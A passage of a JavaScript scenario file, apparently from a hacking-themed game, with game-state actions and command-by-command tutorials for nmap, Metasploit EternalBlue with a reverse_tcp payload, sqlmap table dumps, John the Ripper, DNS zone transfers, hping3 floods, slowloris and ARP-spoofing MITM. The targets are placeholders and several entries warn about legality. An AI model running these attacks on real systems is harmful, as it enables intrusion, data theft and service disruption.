      name: 'Tutorial: Join an Alliance',
      description: 'Learn how to find, join, and work with alliances to achieve common goals.',
      category: 'alliance',
      instructions: [
        'STEP 1 - Finding Alliances:',
        '  1. Navigate to Alliance page',
        '  2. Browse available alliances',
        '  3. Check alliance requirements',
        '  4. Review member count and activity',
        '',
        'STEP 2 - Alliance Benefits:',
        '  • Team up with other players',
        '  • Share resources and knowledge',
        '  • Coordinate attacks',
        '  • Build reputation together',
        '',
        'STEP 3 - Joining Process:',
        '  5. Select alliance',
        '  6. Check if you meet requirements',
        '  7. Submit join request',
        '  8. Wait for approval',
        '',
        'STEP 4 - Working in Alliance:',
        '  • Communicate with members',
        '  • Participate in group activities',
        '  • Contribute to alliance goals',
        '  • Follow alliance rules',
        '',
        'STEP 5 - Creating Alliance:',
        '  • Start your own alliance',
        '  • Set requirements',
        '  • Recruit members',
        '  • Lead alliance activities',
        '',
        'Tip: Alliances make difficult targets much easier to attack!'
      ],
      actions: []
    },
    tutorial_alliance_strategy: {
      id: 'alliance_tutorial_strategy',
      name: 'Tutorial: Alliance Strategy',
      description: 'Learn how to effectively work with alliances and coordinate group attacks.',
      category: 'alliance',
      instructions: [
        'STEP 1 - Coordination:',
        '  1. Plan attacks with alliance members',
        '  2. Assign roles to each member',
        '  3. Coordinate timing',
        '  4. Share target information',
        '',
        'STEP 2 - Role Assignment:',
        '  • Reconnaissance: Gather intel',
        '  • Attack: Execute exploits',
        '  • Support: Provide tools/resources',
        '  • Defense: Protect alliance',
        '',
        'STEP 3 - Communication:',
        '  • Use alliance chat',
        '  • Share findings',
        '  • Report progress',
        '  • Coordinate actions',
        '',
        'STEP 4 - Resource Sharing:',
        '  • Share money if needed',
        '  • Lend equipment',
        '  • Provide tools',
        '  • Support weaker members',
        '',
        'STEP 5 - Group Attacks:',
        '  • Combine skills',
        '  • Multi-vector attacks',
        '  • Divide and conquer',
        '  • Share rewards',
        '',
        'Tip: Well-coordinated alliances can take down high-security targets!'
      ],
      actions: []
    },
    viewAlliances: {
      id: 'alliance_view',
      name: 'View Alliances',
      description: 'View available alliances',
      category: 'alliance',
      actions: []
    },
    createAlliance: {
      id: 'alliance_create',
      name: 'Create Alliance',
      description: 'Create a new alliance',
      category: 'alliance',
      actions: [
        {
          type: 'JOIN_ALLIANCE',
          payload: {
            name: 'Elite Hackers',
            role: 'Leader',
            members: []
          }
        }
      ]
    },
    joinAlliance: {
      id: 'alliance_join',
      name: 'Join Alliance',
      description: 'Join an existing alliance',
      category: 'alliance',
      actions: [
        {
          type: 'JOIN_ALLIANCE',
          payload: {
            name: 'Cyber Warriors',
            role: 'Member',
            members: ['player1', 'player2']
          }
        }
      ]
    }
  },

  // ============ PROFILE SCENARIOS ============
  profile: {
    viewProfile: {
      id: 'profile_view',
      name: 'View Profile',
      description: 'View player profile and stats',
      category: 'profile',
      actions: []
    }
  },

  // ============ ENVIRONMENT TUTORIALS ============
  environment: {
    tutorial_network_environment: {
      id: 'env_tutorial_network',
      name: 'Tutorial: Understand Network Environment',
      description: 'Learn how to view and understand your network environment and connectivity.',
      category: 'environment',
      instructions: [
        'STEP 1 - Accessing Environment:',
        '  1. Navigate to Environment page',
        '  2. View network topology',
        '  3. Check connectivity status',
        '  4. Review network devices',
        '',
        'STEP 2 - Network Information:',
        '  • Your IP address',
        '  • Network range',
        '  • Connected devices',
        '  • Internet status',
        '',
        'STEP 3 - Connectivity:',
        '  • Check internet connection',
        '  • View connection speed',
        '  • Monitor network traffic',
        '  • Identify network issues',
        '',
        'STEP 4 - Network Security:',
        '  • Check firewall status',
        '  • Review network security',
        '  • Identify vulnerabilities',
        '  • Plan network defense',
        '',
        'Tip: Understanding your network helps you attack others and defend yourself!'
      ],
      actions: []
    },
    tutorial_network_scanning: {
      id: 'env_tutorial_scanning',
      name: 'Tutorial: Network Scanning & Discovery',
      description: 'Learn how to scan networks, discover devices, and map network topology.',
      category: 'environment',
      instructions: [
        'STEP 1 - Network Scanning:',
        '  1. Use network scanning tools',
        '  2. Identify active devices',
        '  3. Map network topology',
        '  4. Discover services and ports',
        '',
        'STEP 2 - Device Discovery:',
        '  • Find all devices on network',
        '  • Identify device types',
        '  • Check device security',
        '  • Map device relationships',
        '',
        'STEP 3 - Service Enumeration:',
        '  • Identify open ports',
        '  • Discover running services',
        '  • Check service versions',
        '  • Find vulnerabilities',
        '',
        'STEP 4 - Network Mapping:',
        '  • Create network diagram',
        '  • Identify entry points',
        '  • Plan attack paths',
        '  • Document findings',
        '',
        'Tip: Thorough network scanning is the foundation of successful attacks!'
      ],
      actions: []
    },
    viewEnvironment: {
      id: 'env_view',
      name: 'View Environment',
      description: 'View network environment and connectivity',
      category: 'environment',
      actions: []
    },
    checkInternetConnectivity: {
      id: 'env_check_internet',
      name: 'Check Internet Connectivity',
      description: 'Check internet connection status',
      category: 'environment',
      actions: []
    }
  },

  // ============ COMPLETE GAME FLOW SCENARIOS ============
  gameFlow: {
    newPlayerStart: {
      id: 'flow_new_player',
      name: 'New Player Start',
      description: 'Complete new player onboarding flow',
      category: 'gameFlow',
      actions: [
        {
          type: 'SET_USER',
          payload: {
            username: 'newplayer',
            email: 'new@hackhilis.com'
          }
        },
        {
          type: 'UPDATE_MONEY',
          payload: 10000
        },
        {
          type: 'UPDATE_LEVEL',
          payload: 1
        }
      ]
    },
    beginnerProgress: {
      id: 'flow_beginner',
      name: 'Beginner Progress',
      description: 'Player purchases phone and basic equipment',
      category: 'gameFlow',
      actions: [
        {
          type: 'UPDATE_MONEY',
          payload: 10000
        },
        {
          type: 'PURCHASE_PHONE',
          payload: {
            model: 'Basic Phone',
            securityLevel: 3
          }
        },
        {
          type: 'UPDATE_MONEY',
          payload: -500
        },
        {
          type: 'PURCHASE_EQUIPMENT',
          payload: {
            type: 'laptop',
            item: {
              name: 'Basic Laptop',
              price: 1000,
              stats: { hacking: 5, speed: 3 }
            }
          }
        },
        {
          type: 'UPDATE_MONEY',
          payload: -1000
        }
      ]
    },
    intermediateProgress: {
      id: 'flow_intermediate',
      name: 'Intermediate Progress',
      description: 'Player has equipment, takes courses, starts hacking',
      category: 'gameFlow',
      actions: [
        {
          type: 'UPDATE_MONEY',
          payload: 50000
        },
        {
          type: 'PURCHASE_PHONE',
          payload: {
            model: 'iPhone Pro',
            securityLevel: 8
          }
        },
        {
          type: 'UPDATE_MONEY',
          payload: -1200
        },
        {
          type: 'PURCHASE_EQUIPMENT',
          payload: {
            type: 'laptop',
            item: {
              name: 'Gaming Laptop',
              price: 2500,
              stats: { hacking: 15, speed: 8 }
            }
          }
        },
        {
          type: 'UPDATE_MONEY',
          payload: -2500
        },
        {
          type: 'COMPLETE_COURSE',
          payload: 1
        },
        {
          type: 'UPDATE_SKILL',
          skill: 'hacking',
          payload: 20
        },
        {
          type: 'UPDATE_LEVEL',
          payload: 3
        },
        {
          type: 'UPDATE_EXPERIENCE',
          payload: 2000
        }
      ]
    },
    advancedProgress: {
      id: 'flow_advanced',
      name: 'Advanced Progress',
      description: 'Player has advanced equipment, high skills, successful hacks',
      category: 'gameFlow',
      actions: [
        {
          type: 'UPDATE_MONEY',
          payload: 100000
        },
        {
          type: 'PURCHASE_PHONE',
          payload: {
            model: 'Quantum Phone',
            securityLevel: 10
          }
        },
        {
          type: 'UPDATE_MONEY',
          payload: -5000
        },
        {
          type: 'PURCHASE_EQUIPMENT',
          payload: {
            type: 'laptop',
            item: {
              name: 'Quantum Laptop',
              price: 10000,
              stats: { hacking: 30, speed: 15 }
            }
          }
        },
        {
          type: 'UPDATE_MONEY',
          payload: -10000
        },
        {
          type: 'UPDATE_SKILL',
          skill: 'hacking',
          payload: 50
        },
        {
          type: 'UPDATE_SKILL',
          skill: 'networking',
          payload: 40
        },
        {
          type: 'UPDATE_SKILL',
          skill: 'cryptography',
          payload: 35
        },
        {
          type: 'UPDATE_LEVEL',
          payload: 5
        },
        {
          type: 'UPDATE_EXPERIENCE',
          payload: 4000
        },
        {
          type: 'UPDATE_STATS',
          payload: {
            hacksAttempted: 20,
            hacksSuccessful: 15,
            moneyStolen: 50000,
            reputation: 100
          }
        }
      ]
    }
  },

  // ============ ENVIRONMENT TOOLS TUTORIALS ============
  environment: {
    tutorial_nmap_scanning: {
      id: 'env_tutorial_nmap',
      name: 'Tutorial: Nmap Network Scanning',
      description: 'Learn how to use Nmap for network discovery and port scanning. Accurate Nmap command simulation.',
      category: 'environment',
      instructions: [
        'STEP 1 - Basic Nmap Scan:',
        '  Command: nmap <target>',
        '  • Type: nmap 192.168.1.1',
        '  • Press Enter',
        '  • Basic scan of target IP',
        '  • Shows open ports and services',
        '',
        'STEP 2 - Scan Multiple Targets:',
        '  Command: nmap <ip1> <ip2> <ip3>',
        '  • Type: nmap 192.168.1.1 192.168.1.2 192.168.1.3',
        '  • Scans multiple IPs at once',
        '  • Useful for network mapping',
        '',
        'STEP 3 - Scan IP Range:',
        '  Command: nmap 192.168.1.0/24',
        '  • Type: nmap 192.168.1.0/24',
        '  • Scans entire subnet (256 hosts)',
        '  • Discovers all devices on network',
        '',
        'STEP 4 - Port Scanning Options:',
        '  Command: nmap -p 80,443,22 <target>',
        '  • Type: nmap -p 80,443,22 192.168.1.1',
        '  • Scans specific ports only',
        '  • Faster than full scan',
        '',
        'STEP 5 - Service Version Detection:',
        '  Command: nmap -sV <target>',
        '  • Type: nmap -sV 192.168.1.1',
        '  • Detects service versions',
        '  • Shows OS and software versions',
        '',
        'STEP 6 - OS Detection:',
        '  Command: nmap -O <target>',
        '  • Type: nmap -O 192.168.1.1',
        '  • Attempts OS detection',
        '  • Requires root privileges',
        '',
        'STEP 7 - Aggressive Scan:',
        '  Command: nmap -A <target>',
        '  • Type: nmap -A 192.168.1.1',
        '  • Enables OS detection, version detection, script scanning',
        '  • Most comprehensive scan',
        '',
        'STEP 8 - Stealth Scan (SYN):',
        '  Command: nmap -sS <target>',
        '  • Type: nmap -sS 192.168.1.1',
        '  • Half-open TCP scan',
        '  • Less likely to be logged',
        '',
        'STEP 9 - UDP Scan:',
        '  Command: nmap -sU <target>',
        '  • Type: nmap -sU 192.168.1.1',
        '  • Scans UDP ports',
        '  • Slower than TCP scan',
        '',
        'STEP 10 - Output to File:',
        '  Command: nmap -oN scan.txt <target>',
        '  • Type: nmap -oN scan.txt 192.168.1.1',
        '  • Saves results to file',
        '  • Useful for documentation',
        '',
        'Tip: Use -v for verbose output, -vv for very verbose!'
      ],
      actions: []
    },
    tutorial_wireshark_capture: {
      id: 'env_tutorial_wireshark',
      name: 'Tutorial: Wireshark Packet Capture',
      description: 'Learn packet analysis with Wireshark. Capture and analyze network traffic.',
      category: 'environment',
      instructions: [
        'STEP 1 - Understanding Wireshark Interface:',
        '  • Wireshark is a network protocol analyzer',
        '  • It captures packets traveling over a network',
        '  • The interface shows: Packet List (left), Packet Details (right)',
        '  • Each packet contains multiple protocol layers',
        '  • Click "Start Capture" button to begin',
        '',
        'STEP 2 - Starting Packet Capture:',
        '  • Click the "Start Capture" button in the Wireshark interface',
        '  • The interface will begin capturing network packets',
        '  • Packets will appear in the packet list on the left',
        '  • Each packet shows: Number, Time, Source, Destination, Protocol, Length, Info',
        '  • Watch as packets populate in real-time',
        '',
        'STEP 3 - Understanding Packet Information:',
        '  • Packet Number: Sequential number of captured packet',
        '  • Time: Timestamp when packet was captured',
        '  • Source: IP address of packet sender',
        '  • Destination: IP address of packet receiver',
        '  • Protocol: Network protocol (HTTP, HTTPS, DNS, TCP, UDP, etc.)',
        '  • Length: Size of packet in bytes',
        '  • Info: Summary of packet contents',
        '',
        'STEP 4 - Selecting and Analyzing Packets:',
        '  • Click on any packet in the packet list',
        '  • The packet details panel on the right will show:',
        '  • Frame information (packet number, size, arrival time)',
        '  • Ethernet II header (MAC addresses, frame type)',
        '  • Internet Protocol (IP) header (source/dest IP, protocol)',
        '  • Transport layer (TCP/UDP ports, flags)',
        '  • Application layer data (HTTP requests, DNS queries, etc.)',
        '',
        'STEP 5 - Analyzing HTTP Traffic:',
        '  • Look for packets with protocol "HTTP"',
        '  • Click on an HTTP packet to view details',
        '  • In packet details, expand "Hypertext Transfer Protocol"',
        '  • You can see: HTTP method (GET, POST), URI, headers, response codes',
        '  • This reveals what websites are being accessed',
        '  • HTTP traffic is unencrypted and readable',
        '',
        'STEP 6 - Analyzing HTTPS Traffic:',
        '  • HTTPS packets show protocol "TLS" or "SSL"',
        '  • HTTPS traffic is encrypted',
        '  • You can see the handshake process',
        '  • But the actual data is encrypted and unreadable',
        '  • This is why HTTPS is secure',
        '',
        'STEP 7 - Analyzing DNS Queries:',
        '  • Look for packets with protocol "DNS"',
        '  • DNS packets show domain name resolution',
        '  • You can see: Domain name being queried, IP address returned',
        '  • This reveals what websites users are trying to access',
        '  • Even before they visit the site',
        '',
        'STEP 8 - Identifying Network Patterns:',
        '  • Observe packet frequency and timing',
        '  • Look for repeated connections to same IPs',
        '  • Identify which protocols are most common',
        '  • Notice packet sizes (large = data transfer, small = control)',
        '  • Patterns reveal user behavior and network activity',
        '',
        'STEP 9 - Extracting Sensitive Information:',
        '  • HTTP packets may contain:',
        '  • Login credentials (if sent over HTTP)',
        '  • Session cookies and tokens',
        '  • Personal information in form submissions',
        '  • API keys and authentication tokens',
        '  • Always use HTTPS to prevent this!',
        '',
        'STEP 10 - Stopping Capture:',
        '  • Click "Stop Capture" button when done',
        '  • All captured packets remain visible',
        '  • You can continue analyzing saved packets',
        '  • Click "Save" to export capture to file',
        '  • Saved files can be analyzed later',
        '',
        'STEP 11 - Advanced Analysis:',
        '  • Filter packets by protocol: Look for specific protocols',
        '  • Filter by IP: Focus on traffic to/from specific addresses',
        '  • Follow TCP stream: Reconstruct full conversations',
        '  • Export objects: Extract files transferred over network',
        '  • Statistics: View protocol distribution and conversation lists',
        '',
        'Tip: Wireshark is powerful for network forensics, debugging, and security analysis. Always ensure you have authorization before capturing network traffic!'
      ],
      actions: []
    },
    tutorial_whois_lookup: {
      id: 'env_tutorial_whois',
      name: 'Tutorial: Whois Domain Lookup',
      description: 'Learn to use Whois for domain and IP information gathering.',
      category: 'environment',
      instructions: [
        'STEP 1 - Basic Whois Query:',
        '  Command: whois <domain>',
        '  • Type: whois example.com',
        '  • Press Enter',
        '  • Shows domain registration info',
        '  • Displays registrar, owner, dates',
        '',
        'STEP 2 - Query IP Address:',
        '  Command: whois <ip>',
        '  • Type: whois 8.8.8.8',
        '  • Shows IP address information',
        '  • Displays ISP and location',
        '',
        'STEP 3 - Query with Server:',
        '  Command: whois -h whois.verisign-grs.com <domain>',
        '  • Type: whois -h whois.verisign-grs.com example.com',
        '  • Uses specific whois server',
        '  • Useful for .com domains',
        '',
        'STEP 4 - Get Only Specific Fields:',
        '  Command: whois example.com | grep "Registrar"',
        '  • Type: whois example.com | grep "Registrar"',
        '  • Filters output for specific info',
        '  • Shows only registrar name',
        '',
        'STEP 5 - Query Multiple Domains:',
        '  Command: for domain in example.com test.com; do whois $domain; done',
        '  • Batch query multiple domains',
        '  • Useful for reconnaissance',
        '',
        'Tip: Whois data reveals domain ownership and contact information!'
      ],
      actions: []
    },
    tutorial_dns_enumeration: {
      id: 'env_tutorial_dnsenum',
      name: 'Tutorial: DNS Enumeration',
      description: 'Learn DNS enumeration techniques using dnsenum and related tools.',
      category: 'environment',
      instructions: [
        'STEP 1 - Basic DNS Enumeration:',
        '  Command: dnsenum <domain>',
        '  • Type: dnsenum example.com',
        '  • Press Enter',
        '  • Enumerates DNS records',
        '  • Finds subdomains and records',
        '',
        'STEP 2 - Using dig (Alternative):',
        '  Command: dig <domain>',
        '  • Type: dig example.com',
        '  • Shows DNS A records',
        '  • Basic DNS query',
        '',
        'STEP 3 - Get All Record Types:',
        '  Command: dig example.com ANY',
        '  • Type: dig example.com ANY',
        '  • Shows all DNS record types',
        '  • A, AAAA, MX, TXT, etc.',
        '',
        'STEP 4 - Zone Transfer Attempt:',
        '  Command: dig axfr @ns1.example.com example.com',
        '  • Type: dig axfr @ns1.example.com example.com',
        '  • Attempts DNS zone transfer',
        '  • May reveal all subdomains',
        '',
        'STEP 5 - Subdomain Brute Force:',
        '  Command: dnsenum --subfile subdomains.txt example.com',
        '  • Type: dnsenum --subfile subdomains.txt example.com',
        '  • Brute forces subdomains',
        '  • Uses wordlist file',
        '',
        'STEP 6 - Reverse DNS Lookup:',
        '  Command: dig -x <ip>',
        '  • Type: dig -x 8.8.8.8',
        '  • Reverse DNS lookup',
        '  • Finds hostname from IP',
        '',
        'Tip: DNS enumeration reveals target infrastructure!'
      ],
      actions: []
    },
    tutorial_metasploit_framework: {
      id: 'env_tutorial_metasploit',
      name: 'Tutorial: Metasploit Framework',
      description: 'Learn to use Metasploit for exploitation. Complete Metasploit workflow tutorial.',
      category: 'environment',
      instructions: [
        'STEP 1 - Start Metasploit:',
        '  Command: msfconsole',
        '  • Type: msfconsole',
        '  • Press Enter',
        '  • Opens Metasploit console',
        '  • Prompt changes to: msf6 >',
        '',
        'STEP 2 - Search for Exploits:',
        '  Command: search <keyword>',
        '  • Type: search apache',
        '  • Searches exploit database',
        '  • Lists matching exploits',
        '',
        'STEP 3 - Use an Exploit:',
        '  Command: use exploit/<path>',
        '  • Type: use exploit/windows/smb/ms17_010_eternalblue',
        '  • Selects exploit module',
        '  • Ready to configure',
        '',
        'STEP 4 - Show Options:',
        '  Command: show options',
        '  • Type: show options',
        '  • Shows required parameters',
        '  • Lists RHOSTS, LHOST, etc.',
        '',
        'STEP 5 - Set Target:',
        '  Command: set RHOSTS <ip>',
        '  • Type: set RHOSTS 192.168.1.100',
        '  • Sets target IP address',
        '  • Required for most exploits',
        '',
        'STEP 6 - Set Payload:',
        '  Command: set payload <payload>',
        '  • Type: set payload windows/meterpreter/reverse_tcp',
        '  • Sets payload type',
        '  • Defines connection method',
        '',
        'STEP 7 - Set Listener:',
        '  Command: set LHOST <your_ip>',
        '  • Type: set LHOST 192.168.1.1',
        '  • Sets your IP for reverse shell',
        '  • Required for reverse payloads',
        '',
        'STEP 8 - Execute Exploit:',
        '  Command: exploit',
        '  • Type: exploit',
        '  • Press Enter',
        '  • Runs the exploit',
        '  • Attempts to gain access',
        '',
        'STEP 9 - Meterpreter Commands:',
        '  Command: sysinfo',
        '  • Type: sysinfo',
        '  • Shows target system info',
        '  Command: shell',
        '  • Type: shell',
        '  • Drops to system shell',
        '',
        'Tip: Use "help" in msfconsole to see all available commands!'
      ],
      actions: []
    },
    tutorial_sqlmap_injection: {
      id: 'env_tutorial_sqlmap',
      name: 'Tutorial: SQLMap SQL Injection',
      description: 'Learn to use SQLMap for automated SQL injection testing.',
      category: 'environment',
      instructions: [
        'STEP 1 - Basic SQL Injection Test:',
        '  Command: sqlmap -u "<url>"',
        '  • Type: sqlmap -u "http://example.com/page?id=1"',
        '  • Tests URL for SQL injection',
        '  • Automatically detects vulnerabilities',
        '',
        'STEP 2 - Test POST Data:',
        '  Command: sqlmap -u "<url>" --data="param=value"',
        '  • Type: sqlmap -u "http://example.com/login" --data="user=admin&pass=test"',
        '  • Tests POST parameters',
        '  • Useful for login forms',
        '',
        'STEP 3 - Specify Parameter:',
        '  Command: sqlmap -u "<url>" -p <param>',
        '  • Type: sqlmap -u "http://example.com/page?id=1" -p id',
        '  • Tests specific parameter',
        '  • Faster than testing all',
        '',
        'STEP 4 - Get Database Names:',
        '  Command: sqlmap -u "<url>" --dbs',
        '  • Type: sqlmap -u "http://example.com/page?id=1" --dbs',
        '  • Lists all databases',
        '  • Shows database structure',
        '',
        'STEP 5 - Get Tables:',
        '  Command: sqlmap -u "<url>" -D <database> --tables',
        '  • Type: sqlmap -u "http://example.com/page?id=1" -D mydb --tables',
        '  • Lists tables in database',
        '  • Shows table names',
        '',
        'STEP 6 - Dump Table Data:',
        '  Command: sqlmap -u "<url>" -D <database> -T <table> --dump',
        '  • Type: sqlmap -u "http://example.com/page?id=1" -D mydb -T users --dump',
        '  • Extracts all table data',
        '  • Downloads to local file',
        '',
        'STEP 7 - Get Current User:',
        '  Command: sqlmap -u "<url>" --current-user',
        '  • Type: sqlmap -u "http://example.com/page?id=1" --current-user',
        '  • Shows database user',
        '  • Useful for privilege escalation',
        '',
        'Tip: Use --batch to skip interactive prompts!'
      ],
      actions: []
    },
    tutorial_burp_suite: {
      id: 'env_tutorial_burp',
      name: 'Tutorial: Burp Suite Web Scanner',
      description: 'Learn to use Burp Suite for web application security testing.',
      category: 'environment',
      instructions: [
        'STEP 1 - Start Burp Suite:',
        '  Command: burpsuite',
        '  • Type: burpsuite',
        '  • Press Enter',
        '  • Opens Burp Suite GUI',
        '  • Configure browser proxy',
        '',
        'STEP 2 - Configure Proxy:',
        '  • Set browser proxy to 127.0.0.1:8080',
        '  • Burp listens on port 8080',
        '  • Intercepts all HTTP/HTTPS traffic',
        '',
        'STEP 3 - Intercept Requests:',
        '  • Enable "Intercept" in Proxy tab',
        '  • Browse target website',
        '  • Requests appear in Burp',
        '  • Can modify before sending',
        '',
        'STEP 4 - Send to Repeater:',
        '  • Right-click request',
        '  • Select "Send to Repeater"',
        '  • Modify and resend requests',
        '  • Test different parameters',
        '',
        'STEP 5 - Active Scan:',
        '  • Right-click target in Site map',
        '  • Select "Actively scan this host"',
        '  • Burp tests for vulnerabilities',
        '  • Shows results in Issues tab',
        '',
        'STEP 6 - Intruder for Fuzzing:',
        '  • Send request to Intruder',
        '  • Mark parameters to fuzz',
        '  • Set payloads',
        '  • Start attack',
        '',
        'Tip: Burp Suite is essential for web app penetration testing!'
      ],
      actions: []
    },
    tutorial_john_password_cracking: {
      id: 'env_tutorial_john',
      name: 'Tutorial: John the Ripper',
      description: 'Learn password cracking with John the Ripper.',
      category: 'environment',
      instructions: [
        'STEP 1 - Basic Password Crack:',
        '  Command: john <hashfile>',
        '  • Type: john passwords.txt',
        '  • Press Enter',
        '  • Attempts to crack passwords',
        '  • Uses default wordlist',
        '',
        'STEP 2 - Specify Wordlist:',
        '  Command: john --wordlist=<wordlist> <hashfile>',
        '  • Type: john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt',
        '  • Uses custom wordlist',
        '  • Better success rate',
        '',
        'STEP 3 - Show Cracked Passwords:',
        '  Command: john --show <hashfile>',
        '  • Type: john --show passwords.txt',
        '  • Displays cracked passwords',
        '  • Shows username:password pairs',
        '',
        'STEP 4 - Incremental Mode:',
        '  Command: john --incremental <hashfile>',
        '  • Type: john --incremental passwords.txt',
        '  • Brute force mode',
        '  • Tries all character combinations',
        '',
        'STEP 5 - Format Detection:',
        '  Command: john --format=<format> <hashfile>',
        '  • Type: john --format=md5crypt passwords.txt',
        '  • Specifies hash format',
        '  • Faster cracking',
        '',
        'Tip: John supports many hash formats including MD5, SHA1, bcrypt!'
      ],
      actions: []
    },
    tutorial_osint_gathering: {
      id: 'env_tutorial_osint',
      name: 'Tutorial: OSINT Information Gathering',
      description: 'Learn Open Source Intelligence (OSINT) techniques for reconnaissance.',
      category: 'environment',
      instructions: [
        'STEP 1 - Google Dorking:',
        '  Command: Use Google search operators',
        '  • site:example.com filetype:pdf',
        '  • Finds PDFs on target site',
        '  • Reveals sensitive documents',
        '',
        'STEP 2 - Social Media Recon:',
        '  • Search target on social platforms',
        '  • Check public profiles',
        '  • Find employee information',
        '  • Gather personal details',
        '',
        'STEP 3 - Shodan Search:',
        '  Command: Use Shodan.io',
        '  • Search: org:"Company Name"',
        '  • Finds exposed services',
        '  • Reveals infrastructure',
        '',
        'STEP 4 - Email Harvesting:',
        '  Command: theHarvester -d <domain> -b all',
        '  • Type: theHarvester -d example.com -b all',
        '  • Harvests email addresses',
        '  • Finds employee emails',
        '',
        'STEP 5 - Subdomain Discovery:',
        '  Command: sublist3r -d <domain>',
        '  • Type: sublist3r -d example.com',
        '  • Discovers subdomains',
        '  • Maps target infrastructure',
        '',
        'Tip: OSINT is legal and provides valuable reconnaissance!'
      ],
      actions: []
    },
    tutorial_recon_ng: {
      id: 'env_tutorial_recon',
      name: 'Tutorial: Recon-ng Framework',
      description: 'Learn to use Recon-ng for automated reconnaissance.',
      category: 'environment',
      instructions: [
        'STEP 1 - Start Recon-ng:',
        '  Command: recon-ng',
        '  • Type: recon-ng',
        '  • Press Enter',
        '  • Opens Recon-ng console',
        '  • Prompt: [recon-ng][default] >',
        '',
        'STEP 2 - List Modules:',
        '  Command: modules search',
        '  • Type: modules search',
        '  • Lists available modules',
        '  • Shows reconnaissance tools',
        '',
        'STEP 3 - Load Module:',
        '  Command: modules load <module>',
        '  • Type: modules load recon/domains-hosts/hackertarget',
        '  • Loads specific module',
        '  • Ready to use',
        '',
        'STEP 4 - Set Target:',
        '  Command: options set SOURCE <domain>',
        '  • Type: options set SOURCE example.com',
        '  • Sets target domain',
        '  • Required for most modules',
        '',
        'STEP 5 - Run Module:',
        '  Command: run',
        '  • Type: run',
        '  • Executes loaded module',
        '  • Gathers information',
        '',
        'STEP 6 - View Results:',
        '  Command: show hosts',
        '  • Type: show hosts',
        '  • Displays discovered hosts',
        '  • Shows collected data',
        '',
        'Tip: Recon-ng automates OSINT gathering!'
      ],
      actions: []
    },
    tutorial_ddos_attack: {
      id: 'env_tutorial_ddos',
      name: 'Tutorial: DDoS Attack Simulation',
      description: 'Learn DDoS attack concepts and simulation (educational only).',
      category: 'environment',
      instructions: [
        'STEP 1 - Understanding DDoS:',
        '  • DDoS = Distributed Denial of Service',
        '  • Overwhelms target with traffic',
        '  • Makes service unavailable',
        '  • Requires many machines (botnet)',
        '',
        'STEP 2 - Types of DDoS:',
        '  • Volume-based: UDP floods, ICMP floods',
        '  • Protocol-based: SYN floods, Ping of Death',
        '  • Application-layer: HTTP floods',
        '',
        'STEP 3 - Simulation Tool:',
        '  Command: hping3 --flood <target>',
        '  • Type: hping3 --flood 192.168.1.1',
        '  • Sends flood of packets',
        '  • Educational simulation only',
        '',
        'STEP 4 - Slowloris Attack:',
        '  Command: slowloris <target>',
        '  • Type: slowloris example.com',
        '  • Application-layer attack',
        '  • Keeps connections open',
        '',
        'WARNING: DDoS attacks are illegal without authorization!',
        'This tutorial is for educational purposes only.'
      ],
      actions: []
    },
    tutorial_mitm_attack: {
      id: 'env_tutorial_mitm',
      name: 'Tutorial: Man-in-the-Middle Attack',
      description: 'Learn MITM attack concepts using tools like Ettercap and ARP spoofing.',
      category: 'environment',
      instructions: [
        'STEP 1 - Start ARP Spoofing:',
        '  Command: arpspoof -i <interface> -t <target> <gateway>',
        '  • Type: arpspoof -i eth0 -t 192.168.1.100 192.168.1.1',
        '  • Poisons ARP cache',
        '  • Redirects target traffic',
        '',
        'STEP 2 - Enable IP Forwarding:',
        '  Command: echo 1 > /proc/sys/net/ipv4/ip_forward',
        '  • Type: echo 1 > /proc/sys/net/ipv4/ip_forward',
        '  • Allows traffic forwarding',
        '  • Maintains connection',
        '',
        'STEP 3 - Use Ettercap:',
        '  Command: ettercap -T -M arp:remote /<target1>/ /<target2>/',
        '  • Type: ettercap -T -M arp:remote /192.168.1.100/ /192.168.1.1/',
        '  • Automated MITM tool',
        '  • Intercepts traffic',
        '',
        'STEP 4 - Capture Traffic:',
        '  Command: tcpdump -i eth0 -w capture.pcap',
        '  • Type: tcpdump -i eth0 -w capture.pcap',
        '  • Captures intercepted traffic',
        '  • Can analyze later',
        '',
        'WARNING: MITM attacks are illegal without authorization!',
        'This tutorial is for educational purposes only.'
      ],
      actions: []
    }
  }
};

// Flatten all scenarios into a single array for easy access
export const allScenarios = Object.values(scenarios).reduce((acc, category) => {
  const categoryScenarios = Object.values(category);
  // Ensure all properties are preserved, including instructions
  return acc.concat(categoryScenarios.map(scenario => ({
    ...scenario,
    // Explicitly preserve instructions if it exists
    instructions: scenario.instructions || undefined
  })));
}, []);

// Get scenarios by category
export const getScenariosByCategory = (category) => {
  return scenarios[category] ? Object.values(scenarios[category]) : [];
};

// Get scenario by ID
export const getScenarioById = (id) => {
  return allScenarios.find(scenario => scenario.id === id);
};

// Get all categories
export const getCategories = () => {
  return Object.keys(scenarios);
};

